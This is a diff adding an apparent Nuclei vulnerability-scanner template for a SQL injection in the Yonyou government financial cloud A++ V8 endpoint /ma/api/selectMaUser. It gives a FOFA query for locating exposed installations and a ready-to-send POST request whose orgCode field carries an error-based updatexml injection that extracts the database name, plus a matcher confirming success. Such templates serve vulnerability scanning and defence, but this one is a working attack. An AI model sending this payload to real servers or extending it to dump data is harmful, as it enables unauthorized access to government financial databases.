@@ -1,0 +1,28 @@
+id: yonyouzhengwucaiwuyun-a-v8-selectmauser-sql-injection
+
+info:
+  name: 用友政务财务云A++ V8 /ma/api/selectMaUser SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="用友-政务财务系统"
+    用友政务财务云A++ V8 /ma/api/selectMaUser 接口存在SQL注入漏洞，攻击者可以通过构造恶意的orgCode参数进行注入攻击，可能导致数据库敏感信息泄露，甚至进一步获取服务器系统权限。
+  reference:
+    - 
+  tags: sql-injection, yonyou, cwcloud
+
+http:
+  - raw:
+      - |-
+        POST /ma/api/selectMaUser HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"orgCode":"1' AND (updatexml(1,concat(0x7e,(select database()),0x7e),1)) AND '1'='1"}
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code == 200 && contains_all(body, 'XPATH syntax error')"
